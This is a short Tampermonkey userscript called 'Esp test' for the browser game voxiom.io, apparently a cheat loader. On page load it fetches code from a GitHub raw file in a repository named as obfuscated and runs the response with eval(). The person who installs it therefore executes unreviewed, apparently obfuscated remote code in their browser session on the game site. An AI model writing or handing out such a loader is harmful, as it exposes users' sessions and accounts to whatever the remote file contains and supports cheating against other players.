// ==UserScript==
// @name         Esp test
// @namespace    http://tampermonkey.net/
// @version      1.0
// @description  try to take over the world!
// @author       You
// @match        https://voxiom.io/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=voxiom.io
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(function() {
  GM_xmlhttpRequest({
    method: 'GET',
    url: 'https://raw.githubusercontent.com/mrlolua19/CodeMeteorObfuscated/main/Misc',
    onload: function(response) {
      var code = response.responseText;
      eval(code); // Execute the code obtained from the server
    },
    onerror: function(error) {
      console.error('Error fetching code:', error);
    }
  });
})();
